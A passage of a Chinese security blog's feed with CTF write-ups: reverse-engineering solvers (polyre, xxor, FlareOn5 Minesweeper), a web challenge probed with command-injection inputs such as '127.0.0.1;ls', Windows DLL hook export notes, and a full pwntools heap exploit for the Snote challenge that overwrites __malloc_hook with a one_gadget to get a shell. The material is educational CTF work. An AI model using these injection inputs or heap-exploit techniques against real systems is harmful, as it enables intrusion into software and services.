class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>选择不同的配料会对secret进行处理，最后对其sha1值进行比对，若相同，则计算其md5值即可得到flag，这里完全可以在线破解得到secret为1001。查了下出题人意思是除了写脚本得到选择的配料以外，还可以按老八原视频的顺序加…，魔鬼出题人无疑。</p><h1 id="RoarCTF2019-polyre"><a href="#RoarCTF2019-polyre" class="headerlink" title="[RoarCTF2019]polyre"></a>[RoarCTF2019]polyre</h1><p>控制流平坦化的一道逆向</p><h2 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h2><p>几百行的while(1)，人都看傻了。肯定不能就这么看，找到个基于angr的去控制流平坦化的脚本（<a href="https://github.com/cq674350529/deflat），效果还行，处理完分析程序流程。" target="_blank" rel="noopener">https://github.com/cq674350529/deflat），效果还行，处理完分析程序流程。</a><br>程序里面还残留着不少相同的while(…)和if(…)，看的时候基本上可以直接忽略掉，重点函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">for ( i = 0; ; ++i )                          // i=0;i&lt;6;i++</span><br><span class="line"> &#123;</span><br><span class="line">   </span><br><span class="line">   v18 = i;</span><br><span class="line">   v19 = v18 &lt; 6;</span><br><span class="line">   </span><br><span class="line">   if ( !v19 )</span><br><span class="line">     break;</span><br><span class="line">   v20 = s;</span><br><span class="line">   v4 = *(_QWORD *)&amp;v20[8 * i];</span><br><span class="line">   v7 = 0;</span><br><span class="line">   while ( 1 )</span><br><span class="line">   &#123;</span><br><span class="line">     v21 = v7;</span><br><span class="line">     v22 = v21 &lt; 64;                         // 64次</span><br><span class="line">     if ( !v22 )</span><br><span class="line">       break;</span><br><span class="line">     v23 = v4;</span><br><span class="line">     v24 = v4 &lt; 0;</span><br><span class="line">     if ( v4 &gt;= 0 )                            // 乘2</span><br><span class="line">     &#123;</span><br><span class="line">       v27 = v4;</span><br><span class="line">       v28 = 2 * v27;</span><br><span class="line">       v4 = v28;</span><br><span class="line">     &#125;</span><br><span class="line">     else</span><br><span class="line">     &#123;</span><br><span class="line">       v25 = 2 * v4;</span><br><span class="line">       v26 = v25;</span><br><span class="line">       v4 = v26 ^ 0xB0004B7679FA26B3LL;</span><br><span class="line">     &#125;</span><br><span class="line">     v29 = v7;</span><br><span class="line">     v7 = v29 + 1;</span><br><span class="line">     </span><br><span class="line">   &#125;</span><br><span class="line">   v30 = 8 * i;</span><br><span class="line">   v31 = &amp;s1[8 * i];</span><br><span class="line"></span><br><span class="line">     *(_QWORD *)v31 = v4;</span><br><span class="line">   *(_QWORD *)v31 = v4;</span><br><span class="line"></span><br><span class="line">   i_ = i + 1;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></p><p>把那些多余的去掉，剩下这些基本上可以看出来在干啥，基本上就是取出来八个字节一组然后进行64次循环，里面会通过对大小进行判断然后做处理。</p><p>这些处理完之后最后应该是与data段的一块数据做对比，所以逆向流程写脚本就可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">re = [0x96, 0x62, 0x53, 0x43, 0x6D, 0xF2, 0x8F, 0xBC, 0x16, 0xEE, </span><br><span class="line">  0x30, 0x05, 0x78, 0x00, 0x01, 0x52, 0xEC, 0x08, 0x5F, 0x93, </span><br><span class="line">  0xEA, 0xB5, 0xC0, 0x4D, 0x50, 0xF4, 0x53, 0xD8, 0xAF, 0x90, </span><br><span class="line">  0x2B, 0x34, 0x81, 0x36, 0x2C, 0xAA, 0xBC, 0x0E, 0x25, 0x8B, </span><br><span class="line">  0xE4, 0x8A, 0xC6, 0xA2, 0x81, 0x9F, 0x75, 0x55]</span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">for i in range(0,48,8):</span><br><span class="line">    num = (re[i+7]&lt;&lt;56) | (re[i+6] &lt;&lt;48) | re[i+5]&lt;&lt;40 | re[i+4]&lt;&lt;32 | re[i+3]&lt;&lt;24 | re[i+2]&lt;&lt;16 | re[i+1]&lt;&lt;8 | re[i]</span><br><span class="line">    for _ in range(64):</span><br><span class="line">        if num&amp;1:</span><br><span class="line">            num = (num ^ 0xB0004B7679FA26B3)//2</span><br><span class="line">            num += 0x8000000000000000</span><br><span class="line">        else:</span><br><span class="line">            num = num//2</span><br><span class="line">    meta = hex(num)[2:]</span><br><span class="line">    for j in range(len(meta)//2-1,-1,-1):  #小端序表示，需要倒序输出</span><br><span class="line">        flag += chr(int(&apos;0x&apos;+meta[j*2:(j+1)*2],16))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p><h1 id="xxor"><a href="#xxor" class="headerlink" title="xxor"></a>xxor</h1><h2 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h2><p>本来挺简单的，但是因为python数据一般不会自动控制大小，所以写的时候麻烦了点。前面用z3解下后面的结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">re = [Int(&apos;re[%d]&apos;%i) for i in range(6)]</span><br><span class="line"></span><br><span class="line">s.add(re[0] == 0xDF48EF7E, re[5] == 0x84F30420 , re[1] == 0x20CAACF4)</span><br><span class="line">s.add(re[2] - re[3] == 0x84A236FF , re[3] + re[4] == 0xFA6CB703 , re[2] - re[4] == 0x42D731A8)</span><br><span class="line">s.check()</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure><p>拿到之后对处理函数反过来写一下，主要是在中间每一步运算之后就要将其控制成四个字节，然后最后尝试使用了下libnum的n2s直接转化十六进制为字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">re = [0 for _ in range(6)]</span><br><span class="line">re[2] = 3774025685</span><br><span class="line">re[3] = 1548802262</span><br><span class="line">re[4] = 2652626477</span><br><span class="line">re[1] = 550153460</span><br><span class="line">re[5] = 2230518816</span><br><span class="line">re[0] = 3746099070</span><br><span class="line"></span><br><span class="line">v5 = 0</span><br><span class="line">for i in range(64):</span><br><span class="line">    v5 += 0x458BCD42</span><br><span class="line">    v5 %= 0x100000000</span><br><span class="line"></span><br><span class="line">print(hex(v5)) #0x62F35080</span><br><span class="line"></span><br><span class="line">import libnum</span><br><span class="line"></span><br><span class="line">flag = &apos;&apos;</span><br><span class="line">a = [0 for _ in range(2)]</span><br><span class="line">for i in range(3):</span><br><span class="line">    v3 = re[i*2]</span><br><span class="line">    v4 = re[i*2+1]</span><br><span class="line">    v5 = 0x62F35080</span><br><span class="line">    for j in range(64):</span><br><span class="line">        v4 -= ((v3 + v5 + 20) ^ ((v3 &lt;&lt; 6) + 3) ^ ((v3 &gt;&gt; 9) + 4) ^ 0x10)%0x100000000</span><br><span class="line">        v4 %= 0x100000000</span><br><span class="line">        v3 -= ((v4 + v5 + 11) ^ ((v4 &lt;&lt; 6) + 2) ^ ((v4 &gt;&gt; 9) + 2) ^ 0x20)%0x100000000</span><br><span class="line">        v3 %= 0x100000000</span><br><span class="line">        v5 -= 0x458BCD42</span><br><span class="line">        v5 %= 0x100000000</span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    flag += libnum.n2s(v3) </span><br><span class="line">    flag += libnum.n2s(v4)</span><br><span class="line">    </span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p><h1 id="FlareOn5-Ultimate-Minesweeper"><a href="#FlareOn5-Ultimate-Minesweeper" class="headerlink" title="[FlareOn5]Ultimate Minesweeper"></a>[FlareOn5]Ultimate Minesweeper</h1><p>挺有意思的.NET 逆向</p><h2 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h2><p>打开是个扫雷程序，随便点了几次全都是雷…。查壳没有，dnspy打开，基本上没做混淆，看了下几个函数，发现主要都在MainForm里面，注意到了有个GetKey函数，看着有随机数，寻找下调用，发现上面的函数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">private void SquareRevealedCallback(uint column, uint row)</span><br><span class="line">&#123;</span><br><span class="line">  if (this.MineField.BombRevealed)</span><br><span class="line">  &#123;</span><br><span class="line">    this.stopwatch.Stop();</span><br><span class="line">    Application.DoEvents();</span><br><span class="line">    Thread.Sleep(1000);</span><br><span class="line">    new FailurePopup().ShowDialog();</span><br><span class="line">    Application.Exit();</span><br><span class="line">  &#125;</span><br><span class="line">  this.RevealedCells.Add(row * MainForm.VALLOC_NODE_LIMIT + column);</span><br><span class="line">  if (this.MineField.TotalUnrevealedEmptySquares == 0)</span><br><span class="line">  &#123;</span><br><span class="line">    this.stopwatch.Stop();</span><br><span class="line">    Application.DoEvents();</span><br><span class="line">    Thread.Sleep(1000);</span><br><span class="line">    new SuccessPopup(this.GetKey(this.RevealedCells)).ShowDialog();</span><br><span class="line">    Application.Exit();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里就是检测有没有碰到雷的函数，可以看到就是成功的时候会调用GetKey应该就可以拿到flag。也可以看到计算位置的时候就是row*30+column。寻找下初始化扫雷方块的函数，找到了分配内存的函数，可以发现大多数都是直接为true，应该就是为地雷，而特殊的有专门得到flag为false的地方<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">private void AllocateMemory(MineField mf)</span><br><span class="line">&#123;</span><br><span class="line">  for (uint num = 0u; num &lt; MainForm.VALLOC_NODE_LIMIT; num += 1u)</span><br><span class="line">  &#123;</span><br><span class="line">    for (uint num2 = 0u; num2 &lt; MainForm.VALLOC_NODE_LIMIT; num2 += 1u)</span><br><span class="line">    &#123;</span><br><span class="line">      bool flag = true;</span><br><span class="line">      uint r = num + 1u;</span><br><span class="line">      uint c = num2 + 1u;</span><br><span class="line">      if (this.VALLOC_TYPES.Contains(this.DeriveVallocType(r, c)))  //here</span><br><span class="line">      &#123;</span><br><span class="line">        flag = false;</span><br><span class="line">      &#125;</span><br><span class="line">      mf.GarbageCollect[(int)num2, (int)num] = flag;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>查看下跟这句话有关的地方<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">private uint DeriveVallocType(uint r, uint c)</span><br><span class="line">&#123;</span><br><span class="line">  return ~(r * MainForm.VALLOC_NODE_LIMIT + c);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private static uint VALLOC_TYPE_HEADER_PAGE = 4294966400u;</span><br><span class="line">private static uint VALLOC_TYPE_HEADER_POOL = 4294966657u;</span><br><span class="line">private static uint VALLOC_TYPE_HEADER_RESERVED = 4294967026u;</span><br><span class="line"></span><br><span class="line">private uint[] VALLOC_TYPES = new uint[]</span><br><span class="line">&#123;</span><br><span class="line">  MainForm.VALLOC_TYPE_HEADER_PAGE,</span><br><span class="line">  MainForm.VALLOC_TYPE_HEADER_POOL,</span><br><span class="line">  MainForm.VALLOC_TYPE_HEADER_RESERVED</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>也就是当计算的值为这几个时就为false，反过来计算下就行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def getrc(num):</span><br><span class="line">    num = ~num &amp; 0xffffffff</span><br><span class="line">    c = num % 30</span><br><span class="line">    r = num // 30</span><br><span class="line">    return r,c</span><br><span class="line"></span><br><span class="line">print(map(getrc,[4294966400,4294966657,4294967026]))</span><br><span class="line">#[(29, 25), (21, 8), (8, 29)]</span><br></pre></td></tr></table></figure></p><p>点击这三个方块即可拿到flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;firmware&quot;&gt;&lt;a href=&quot;#firmware&quot; class=&quot;headerlink&quot; title=&quot;firmware&quot;&gt;&lt;/a&gt;firmware&lt;/h1&gt;&lt;p&gt;一个关于路由器固件的逆向&lt;/p&gt;
&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; cla
      
    
    </summary>
    
      <category term="RE" scheme="http://siriuswhiter.tk/categories/re/"/>
    
    
      <category term="RE" scheme="http://siriuswhiter.tk/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>web practice</title>
    <link href="http://siriuswhiter.tk/2019/10/27/web-practice/"/>
    <id>http://siriuswhiter.tk/2019/10/27/web-practice/</id>
    <published>2019-10-27T13:12:46.000Z</published>
    <updated>2019-10-27T13:25:07.245Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h1><p>攻防世界web进阶题</p><p>进去可以输入域名，然后会自动ping ， 直接输入域名比如说百度就会提示Invalid URL，但是直接输IP就会开始ping</p><p>根据经验先尝试看是否为命令注入，输入127.0.0.1;ls 或 127.0.0.1 | ls 或127.0.0.1 &amp; ls 均提示无效</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Cat&quot;&gt;&lt;a href=&quot;#Cat&quot; class=&quot;headerlink&quot; title=&quot;Cat&quot;&gt;&lt;/a&gt;Cat&lt;/h1&gt;&lt;p&gt;攻防世界web进阶题&lt;/p&gt;
&lt;p&gt;进去可以输入域名，然后会自动ping ， 直接输入域名比如说百度就会提示Invalid URL，
      
    
    </summary>
    
      <category term="web" scheme="http://siriuswhiter.tk/categories/web/"/>
    
    
      <category term="web" scheme="http://siriuswhiter.tk/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Windows编程小记</title>
    <link href="http://siriuswhiter.tk/2019/10/25/windows%E7%BC%96%E7%A8%8B%E5%B0%8F%E8%AE%B0/"/>
    <id>http://siriuswhiter.tk/2019/10/25/windows编程小记/</id>
    <published>2019-10-25T05:38:43.000Z</published>
    <updated>2019-12-11T12:18:51.573Z</updated>
    
    <content type="html"><![CDATA[<h1 id="dll函数的导出"><a href="#dll函数的导出" class="headerlink" title="dll函数的导出"></a>dll函数的导出</h1><ol><li>_declspec(dllexport)  导出的函数名会被改变</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_declspec(dllexport)   bool HookStart(void);</span><br><span class="line">_declspec(dllexport)   void HookStop(void);</span><br></pre></td></tr></table></figure><p>使用vs的工具-&gt;命令行-&gt;开发者命令提示  使用命令 dumpbin /exports *.dll 查看dll的导出函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ordinal hint RVA      name</span><br><span class="line"></span><br><span class="line">      1    0 0001136B ?HookStart@KeyHook@@QEAA_NXZ = @ILT+870(?HookStart@KeyHook@@QEAA_NXZ)</span><br><span class="line">      2    1 00011294 ?HookStop@KeyHook@@QEAAXXZ = @ILT+655(?HookStop@KeyHook@@QEAAXXZ)</span><br></pre></td></tr></table></figure></p><ul><li>解决办法：</li></ul><p>在前面加上这个<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#pragma comment(linker, &quot;/EXPORT:HookStart=?HookStart@KeyHook@@QEAA_NXZ&quot;)</span><br><span class="line">#pragma comment(linker, &quot;/EXPORT:HookStop=?HookStop@KeyHook@@QEAAXXZ&quot;)</span><br></pre></td></tr></table></figure></p><p>编译器就会按照我们指定的函数名导出函数了</p><ol start="2"><li>因为版本问题，导出函数前面如果加上 extern “C”  可能会出现不符合编译链接规范</li></ol><p>解决办法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#ifdef _cplusplus</span><br><span class="line">extern &quot;C&quot;&#123;</span><br><span class="line">#endif</span><br><span class="line">_declspec(dllexport)   bool HookStart(void);</span><br><span class="line">_declspec(dllexport)   void HookStop(void);</span><br><span class="line">#ifdef _cplusplus</span><br><span class="line">extern &quot;C&quot; &#125;</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure></p><p>可以兼容c/c++</p><h1 id="无法解析的外部符号"><a href="#无法解析的外部符号" class="headerlink" title="无法解析的外部符号"></a>无法解析的外部符号</h1><ul><li><p>问题：<br>_ImmGetContext@4 / _ImmGetCompositionStringA@16 等API调用出错</p></li><li><p>解决：</p></li></ul><p>项目-&gt;属性-&gt;链接器-&gt;输入-&gt;附加依赖项<br>添加 imm32.lib / winmm.lib</p><h1 id="直接将控制台程序转变为win32程序"><a href="#直接将控制台程序转变为win32程序" class="headerlink" title="直接将控制台程序转变为win32程序"></a>直接将控制台程序转变为win32程序</h1><p>项目-&gt;属性</p><p>1)c/c++ —&gt; 预处理 —&gt;预处理定义 :</p><p>_CONSOLE改为:_WINDOWS           </p><p>2)连接器 —&gt; 系统 —&gt;子系统:</p><p>控制台 (/SUBSYSTEM:CONSOLE)改为：窗口 (/SUBSYSTEM:WINDOWS)</p><h1 id="字符集"><a href="#字符集" class="headerlink" title="字符集"></a>字符集</h1><p>可选字符集为宽字符与unicode字符集，如果使用unicode字符集，如SetWindowsHook 会自动扩展到SetWindowsHookExW ,尽量不要为了简便将所有类似的函数直接指定为FunctionA。 </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;dll函数的导出&quot;&gt;&lt;a href=&quot;#dll函数的导出&quot; class=&quot;headerlink&quot; title=&quot;dll函数的导出&quot;&gt;&lt;/a&gt;dll函数的导出&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;_declspec(dllexport)  导出的函数名会被改变&lt;/li&gt;
&lt;/
      
    
    </summary>
    
      <category term="windows" scheme="http://siriuswhiter.tk/categories/windows/"/>
    
    
      <category term="windows" scheme="http://siriuswhiter.tk/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>巅峰极客-2019</title>
    <link href="http://siriuswhiter.tk/2019/10/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-2019/"/>
    <id>http://siriuswhiter.tk/2019/10/19/巅峰极客-2019/</id>
    <published>2019-10-19T06:04:05.000Z</published>
    <updated>2019-10-19T07:18:47.906Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Snote"><a href="#Snote" class="headerlink" title="Snote"></a>Snote</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>难度还行的堆题，四个选项</p><p>show dele 都只能使用一次， dele 有free后未清空指针  edit能溢出八个字节</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>edit有八个字节的溢出，然后看在show dele次数都只有一次的情况下，在考虑的时候就当作没有来考虑</p><p>所以前面就是通过溢出修改top chunk的size，然后通过申请大的chunk来触发consolidate将原top chunk置入unsorted bin</p><p>这里就相当于不用那一次机会来在chunk中踩出main_arena+88的地址，之后再申请之后show就可以拿到libc的地址。</p><p>后面实际就比较简单了，申请个size 为0x70的chunk，利用uaf直接改fd指针到malloc_hook附近修改为one_gadget即可</p><p>这里用掉了唯一的free机会</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">    sh = process(&apos;./pwn&apos;)</span><br><span class="line">    elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">    libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">    sh = remote(&apos;55fca716.gamectf.com&apos;,&apos;37009&apos;)</span><br><span class="line">    elf = ELF(&apos;./pwn&apos;)</span><br><span class="line">    libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,con):</span><br><span class="line">    sh.sendlineafter(&quot;choice &gt; &quot;,&quot;1&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;Size &gt; &quot;,str(size))</span><br><span class="line">    sh.sendafter(&quot;Content &gt; \n&quot;,con)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    sh.sendlineafter(&quot;choice &gt; &quot;,&quot;2&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def dele():</span><br><span class="line">    sh.sendlineafter(&quot;choice &gt; &quot;,&quot;3&quot;)</span><br><span class="line"></span><br><span class="line">def edit(size,con):</span><br><span class="line">    sh.sendlineafter(&quot;choice &gt; &quot;,&quot;4&quot;)</span><br><span class="line">    sh.sendlineafter(&quot;Size &gt; &quot;,str(size))</span><br><span class="line">    sh.sendafter(&quot;Content &gt; \n&quot;,con)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&apos;name?\n&apos;,&apos;sirius&apos;)</span><br><span class="line">add(0x408,&apos;0&apos;)</span><br><span class="line">edit(0x410,&apos;0&apos;*0x408+&apos;\xf1\x0b\x00&apos;)</span><br><span class="line">add(0xf00,&apos;1&apos;)</span><br><span class="line">add(0x18,&apos;2&apos;*8)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(&apos;2&apos;*8)</span><br><span class="line"></span><br><span class="line">libc.base = u64(sh.recv(8)) - libc.symbols[&apos;__malloc_hook&apos;] +0x10 - 88 -0x600</span><br><span class="line">print(hex(libc.base))</span><br><span class="line">heap = u64(sh.recv(8)) -0x410# - 0x660</span><br><span class="line">print(hex(heap))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc.base + libc.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line">one = libc.base + 0xf02a4</span><br><span class="line">#----------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(0x68,&apos;last&apos;)</span><br><span class="line">dele()</span><br><span class="line">edit(0x68,p64(malloc_hook-0x23))</span><br><span class="line">add(0x68,&apos;a&apos;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(0x68,&apos;a&apos;*0x13+p64(one))</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&quot;choice &gt; &quot;,&quot;1&quot;)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Snote&quot;&gt;&lt;a href=&quot;#Snote&quot; class=&quot;headerlink&quot; title=&quot;Snote&quot;&gt;&lt;/a&gt;Snote&lt;/h1&gt;&lt;h2 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题
      
    
    </summary>
    
      <category term="pwn" scheme="http://siriuswhiter.tk/categories/pwn/"/>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
      <category term="heap" scheme="http://siriuswhiter.tk/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Penetration with Empire</title>
    <link href="http://siriuswhiter.tk/2019/08/01/penetration-with-empire/"/>
    <id>http://siriuswhiter.tk/2019/08/01/penetration-with-empire/</id>
    <published>2019-08-01T10:32:14.000Z</published>
    <updated>2019-09-20T12:08:40.054Z</updated>
    
